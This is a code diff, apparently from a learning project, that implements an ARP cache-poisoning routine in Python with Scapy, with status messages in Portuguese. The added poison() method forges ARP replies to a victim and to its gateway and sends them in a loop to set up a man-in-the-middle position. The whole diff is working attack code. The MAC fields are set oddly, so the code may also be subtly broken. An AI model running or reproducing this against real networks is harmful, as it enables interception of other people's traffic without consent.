@@ -37,8 +37,46 @@ class Arper:
         self.sniff_thread.start()
 
     def poison (self):
-        pass
+        poison_victim = ARP()
+        poison_victim.op = 2
+        poison_victim.psrc = self.gateway
+        poison_victim.pdst = self.victim
+        poison_victim.hwdst = self.victim_mac
+        poison_victim.hwsrc = self.gateway_mac
+        print(f'ip de origem: {poison_victim.psrc}')
+        print(f'ip de destino: {poison_victim.pdst}')
+        print(f'mac de destino: {poison_victim.hwdst}')
+        print(f'mac de origem: {poison_victim.hwsrc}')
+        print(poison_victim.summary())
+        print('-'*30)
+        
+        poison_gateway = ARP()
+        poison_gateway.op = 2
+        poison_gateway.psrc = self.victim
+        poison_gateway.pdst = self.gateway
+        poison_gateway.hwdst = self.gateway_mac
+        poison_gateway.hwsrc = self.victim_mac
+        print(f'ip de origem: {poison_gateway.psrc}')
+        print(f'ip de destino: {poison_gateway.pdst}')
+        print(f'mac de destino: {poison_gateway.hwdst}')
+        print(f'mac de origem: {poison_gateway.hwsrc}')
+        print(poison_gateway.summary())
+        print('-'*30)
 
+        print(f'Iniciando o envenenamento ARP. [CRTL+C para interromper]')
+
+        while True:
+            sys.stdout.write('.')
+            sys.stdout.flush()
+            try:
+                send(poison_victim)
+                send(poison_gateway)
+            except KeyboardInterrupt:
+                self.restore()
+                sys.exit()
+            else:
+                time.sleep(2)
+                
     def sniff(self, count = 200):
         pass
 
